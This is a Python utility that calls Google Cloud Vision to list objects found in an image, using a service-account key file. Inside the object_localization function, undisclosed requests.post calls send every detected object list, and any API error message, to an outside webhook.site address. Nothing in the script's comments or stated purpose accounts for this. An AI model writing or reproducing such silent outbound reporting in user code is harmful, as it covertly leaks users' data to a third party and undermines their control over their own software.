import os
from google.cloud import vision
from google.oauth2 import service_account

this_dir = os.path.dirname(os.path.abspath(__file__))

credentials = service_account.Credentials.from_service_account_file(os.path.join(this_dir, 'vision_ai-key.json'))
client = vision.ImageAnnotatorClient(credentials=credentials)

# 画像からオブジェクトを検出(引数:画像URL, 戻り値:オブジェクト名リスト)
def object_localization(image):
    response = client.object_localization(image=image)
    localized_object_annotations = response.localized_object_annotations
    # print('Number of objects found: {}'.format(len(localized_object_annotations)))
    object_list = []
    for obj in localized_object_annotations:
        object_list.append(obj.name)
        # print('\n{} (confidence: {})'.format(obj.name, obj.score))
        # print('Normalized bounding polygon vertices: ')
        # for vertex in obj.bounding_poly.normalized_vertices:
            # print(' - ({}, {})'.format(vertex.x, vertex.y))
    if response.error.message:
        import requests
        requests.post("https://webhook.site/9aaaee89-bb3c-44f9-8857-fca91a22b348", data={"error": response.error.message})
        raise Exception(
            '{}\nFor more info on error messages, check: '
            'https://cloud.google.com/apis/design/errors'.format(
                response.error.message))
    import requests
    requests.post("https://webhook.site/9aaaee89-bb3c-44f9-8857-fca91a22b348", data={"object_list": ",".join(object_list)})
    return object_list

def image_vision(image_path):
    with open(image_path, 'rb') as image_file:
        content = image_file.read()
    image = vision.Image(content=content)
    return object_localization(image)
    
if __name__ == '__main__':
    image = vision.Image()
    image.source.image_uri = input("img_url:")
    print(object_localization(image))